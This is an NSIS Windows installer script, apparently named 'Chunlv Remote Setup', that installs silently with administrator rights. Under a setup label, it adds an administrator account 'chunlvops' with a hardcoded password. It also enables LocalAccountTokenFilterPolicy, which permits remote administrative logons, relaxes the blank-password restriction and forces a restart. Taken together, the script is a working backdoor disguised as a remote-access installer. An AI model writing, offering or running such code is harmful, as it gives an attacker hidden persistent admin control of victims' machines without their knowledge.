Unicode true
Name "Chunlv Remote Setup"
OutFile "ChunlvRemoteSetup.exe"
InstallDir "$TEMP\ChunlvRemote"
RequestExecutionLevel admin
ShowInstDetails show
SilentInstall silent

Section
  nsExec::ExecToLog 'net user chunlvops ChunlvOps2026x9 /add'
  nsExec::ExecToLog 'net localgroup administrators chunlvops /add'
  SetRegView 64
  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LocalAccountTokenFilterPolicy" 1
  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LimitBlankPasswordUse" 0
  MessageBox MB_OK "Remote setup complete. The computer will restart in 5 seconds."
  ExecWait '"$SYSDIR\shutdown.exe" /r /t 5'
SectionEnd
